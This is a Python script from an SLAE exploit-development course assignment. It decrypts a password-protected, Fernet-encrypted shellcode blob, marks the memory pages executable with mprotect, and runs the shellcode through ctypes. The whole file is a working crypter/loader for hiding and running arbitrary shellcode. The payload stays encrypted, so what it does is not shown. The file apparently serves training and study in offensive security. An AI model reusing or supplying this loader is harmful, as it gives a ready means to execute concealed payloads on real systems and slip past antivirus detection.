########################################
# Filename: Encoder.py
# Author  : Andrea Perfetti
# SLAE ID : SLAE - 1547
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Add the encoded shellcode in the 'encrypted_payload' variable
# then run the script to decode and execute the payload.
########################################

import string
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import *


# Update here the shellcode to be decrypted
encrypted_payload = b"6CMVJFV8CRGHUDTBgAAAAABgTiu-rfePZYGrr3XhaPa3tV3mzgHTtAL9Q1pq2GQMMIAswWuaTYgrpIzg8iUSGJiuet81dSXj7i1TlM-U2sw2D9oNjSpxXqXh7okST_lCHEiWel19dGfrg1tKuchkQrMq0FL3uoVPDHtl87Z0jru_nO4bfw1qHX5GbLuf0HRe4uH_Wq1t_Z82ueDbTOaGLcywVKTXFNQ5VpzG0DLQvSS13Teby0tPfJGx9zjE7jMIiIX0BBw="


salt = encrypted_payload[:16]
cipher_text = encrypted_payload[16:]

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt,
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
shellcode_data = cipher_suite.decrypt(cipher_text)


shellcode=create_string_buffer(shellcode_data)
invoke_shellcode = cast(shellcode, CFUNCTYPE(None))

libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
address = cast(invoke_shellcode, c_void_p).value
address_page = (address // pagesize) * pagesize

for page_start in range(address_page, address+len(shellcode_data), pagesize):
	assert libc.mprotect(page_start, pagesize, 0x7) == 0
invoke_shellcode()